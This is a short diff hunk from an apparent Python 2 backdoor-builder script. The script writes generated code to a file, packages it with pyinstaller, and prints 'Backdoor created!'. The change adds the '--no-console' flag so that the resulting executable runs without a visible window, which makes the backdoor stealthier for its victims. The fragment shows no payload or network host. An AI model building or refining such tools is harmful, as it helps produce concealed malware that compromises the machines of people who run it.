@@ -82,7 +82,7 @@ try:
     f = open (argv [-1], 'w')
     f.write (maket)
     f.close ()
-    system ('pyinstaller ' + argv [-1])
+    system ('pyinstaller --no-console ' + argv [-1])
     print Fore.CYAN + '[*] ' + Fore.RESET + ' Backdoor created!'
 except:
     print Fore.RED + '[!]' + Fore.RESET + ' Error!'
